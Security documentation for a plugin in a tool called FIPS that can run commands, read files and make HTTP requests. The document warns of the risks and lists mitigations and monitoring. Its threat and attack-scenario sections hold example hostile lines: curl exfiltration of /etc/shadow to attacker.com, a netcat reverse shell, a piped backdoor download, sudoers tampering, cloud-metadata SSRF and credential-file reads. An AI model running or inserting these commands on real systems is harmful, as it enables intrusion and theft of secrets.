# ⚠️ FIPS System Callout Plugin - Security Documentation ⚠️

## Overview

The system callout plugin demonstrates that FIPS plugins can execute arbitrary system commands, read files, access environment variables, and make network requests. **This is extremely powerful but also extremely dangerous.**

## Plugin Functions

### 1. SystemCommand
Executes arbitrary system commands with arguments.

**Example:**
```yaml
- name: "SystemCommand"
  path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
  args: ["ls", "-la", "/tmp"]
```

### 2. GetEnvVar
Reads environment variables from the server process.

**Example:**
```yaml
- name: "GetEnvVar"
  path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
  args: ["HOME"]
```

### 3. ReadFile
Reads arbitrary files from the filesystem.

**Example:**
```yaml
- name: "ReadFile"
  path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
  args: ["/etc/passwd"]
```

### 4. HttpRequest
Makes HTTP requests to arbitrary URLs.

**Example:**
```yaml
- name: "HttpRequest"
  path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
  args: ["http://internal-api.local/secrets"]
```

## Security Threats

### 🔴 CRITICAL: Arbitrary Code Execution
```yaml
# Attacker can run ANY command if they control plugin args:
args: ["rm", "-rf", "/"]
args: ["curl", "http://attacker.com", "-d", "@/etc/shadow"]
args: ["python3", "-c", "import os; os.system('...')"]
```

### 🔴 CRITICAL: Data Exfiltration
```yaml
# Read sensitive files:
args: ["/home/user/.ssh/id_rsa"]
args: ["/var/www/app/config/database.yml"]
args: ["~/.aws/credentials"]

# Send to attacker:
- name: "SystemCommand"
  args: ["curl", "-X", "POST", "http://attacker.com", "-d", "@/etc/passwd"]
```

### 🔴 CRITICAL: Environment Variable Exposure
```yaml
# Expose secrets commonly stored in env vars:
args: ["DATABASE_PASSWORD"]
args: ["AWS_SECRET_ACCESS_KEY"]
args: ["JWT_SECRET"]
args: ["API_KEY"]
```

### 🔴 CRITICAL: Server-Side Request Forgery (SSRF)
```yaml
# Access internal services:
args: ["http://169.254.169.254/latest/meta-data/iam/security-credentials/"]  # AWS metadata
args: ["http://localhost:6443/api/v1/secrets"]  # Kubernetes API
args: ["http://internal-admin-panel.local/users"]
```

### 🔴 CRITICAL: Privilege Escalation
If FIPS runs as root or with sudo access:
```yaml
args: ["sudo", "usermod", "-aG", "sudo", "attacker"]
args: ["sudo", "bash", "-c", "echo 'attacker ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"]
```

### 🔴 CRITICAL: Lateral Movement
```yaml
# Scan internal network:
args: ["nmap", "192.168.1.0/24"]

# SSH to other systems:
args: ["ssh", "user@internal-server", "command"]

# Pivot through server:
args: ["nc", "-e", "/bin/bash", "attacker.com", "4444"]
```

## Attack Scenarios

### Scenario 1: User Input in Plugin Args
```yaml
# NEVER DO THIS:
- Rule:
    name: "Dangerous"
    when:
      matchesUris:
        - uri: ^/api/execute$
    then:
      functionAs: "Mock"
      body:
        result: "{{SystemCommand}}"
    with:
      plugins:
        - name: "SystemCommand"
          path: "./plugins/system_callout/target/release/libsystem_callout.dylib"
          args: ["{{user_input}}"]  # ❌ CATASTROPHIC
```

**Attacker sends:**
```bash
curl -X POST http://server/api/execute -d '{"user_input": "rm -rf /"}'
```

### Scenario 2: Configuration Injection
If configuration files are dynamically generated or user-controllable:
```yaml
# Attacker modifies nrule.yml:
args: ["bash", "-c", "curl http://attacker.com/backdoor.sh | bash"]
```

### Scenario 3: Plugin Path Manipulation
```yaml
# If plugin paths are controllable:
path: "/tmp/malicious-plugin.so"  # Attacker's compiled plugin
```

### Scenario 4: Time-Based Blind Exfiltration
```yaml
# Exfiltrate data character by character:
args: ["bash", "-c", "if [ $(cut -c1 /etc/passwd) = 'r' ]; then sleep 5; fi"]
```

## Mitigation Strategies

### 1. ✅ Never Use in Production
This plugin is for **demonstration and testing only**. Do not deploy to production.

### 2. ✅ Input Validation
```rust
// If you must use system callouts, validate EVERYTHING:
fn validate_command(cmd: &str) -> bool {
    // Whitelist only
    matches!(cmd, "date" | "whoami" | "uptime")
}

fn validate_file_path(path: &str) -> bool {
    // Only allow specific directories
    path.starts_with("/tmp/safe-dir/") && !path.contains("..")
}
```

### 3. ✅ Principle of Least Privilege
- Run FIPS as non-root user
- Use dedicated user with minimal permissions
- Restrict file system access with chroot/containers
- Use AppArmor/SELinux policies

### 4. ✅ Sandboxing
```yaml
# Run FIPS in isolated environment:
docker run --rm \
  --user 1000:1000 \
  --read-only \
  --no-new-privileges \
  --cap-drop=ALL \
  --network=none \
  fips-container
```

### 5. ✅ Configuration Auditing
- Store configurations in version control
- Require code review for plugin additions
- Implement RBAC for configuration changes
- Log all plugin executions

### 6. ✅ Network Isolation
- Firewall rules to block outbound connections
- Network segmentation
- Monitor for unusual traffic patterns

### 7. ✅ Runtime Monitoring
```bash
# Monitor process execution:
auditctl -a exit,always -F arch=b64 -S execve -k fips-exec

# Monitor file access:
auditctl -w /etc -p r -k fips-file-read

# Monitor network:
tcpdump -i any -w fips-traffic.pcap
```

## Safe Use Cases

### ✅ Acceptable: Static, Hardcoded Commands
```yaml
# OK: No user input, specific command:
- name: "SystemCommand"
  args: ["date", "+%Y-%m-%d"]
```

### ✅ Acceptable: Read-Only, Non-Sensitive Data
```yaml
# OK: Public data, no secrets:
- name: "ReadFile"
  args: ["./public/version.txt"]
```

### ✅ Acceptable: Whitelisted External APIs
```yaml
# OK: Controlled, public API:
- name: "HttpRequest"
  args: ["https://api.github.com/repos/soultice/fips"]
```

## Detection & Response

### Indicators of Compromise (IoCs)
```bash
# Look for:
- Unusual child processes from FIPS
- Network connections to unknown IPs
- File reads from sensitive directories
- Privilege escalation attempts
- Encoded/obfuscated commands
```

### Logging
```rust
// Log every plugin execution:
log::warn!(
    "SECURITY: Plugin executed - name:{}, path:{}, args:{:?}, result:{}",
    plugin_name, plugin_path, args, result
);
```

## Building the Plugin

```bash
cd plugins/system_callout
cargo build --release
```

**Output:** `target/release/libsystem_callout.dylib` (macOS) or `.so` (Linux)

## Testing the Plugin

### 1. Start FIPS with demo config:
```bash
cargo run -- -c ./nconfig-test/
```

### 2. Test safe operations:
```bash
curl http://localhost:8888/demo/safe | jq
```

### 3. Test dangerous operations (controlled environment only):
```bash
curl http://localhost:8888/demo/dangerous | jq
```

### 4. Test command injection risk:
```bash
curl http://localhost:8888/demo/injection | jq
```

## Legal & Ethical Considerations

⚖️ **This plugin can be used for:**
- Security research and testing
- Penetration testing (authorized)
- DevOps automation (controlled)
- Demonstration and education

❌ **This plugin must NOT be used for:**
- Unauthorized access
- Malicious activity
- Production systems without security review
- Processing untrusted input

## Conclusion

This plugin demonstrates that **FIPS plugins are Turing-complete and can do anything the server process can do**. This includes:

✅ **Legitimate uses:**
- System monitoring and health checks
- Integration with deployment tools
- Custom business logic
- Data transformation

❌ **Security risks:**
- Arbitrary code execution
- Data exfiltration
- Lateral movement
- Privilege escalation
- SSRF attacks

**Key Takeaway:** Treat plugin configuration files with the same security rigor as you would treat source code. A malicious plugin or plugin configuration can fully compromise your system.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP SSRF](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-918: SSRF](https://cwe.mitre.org/data/definitions/918.html)
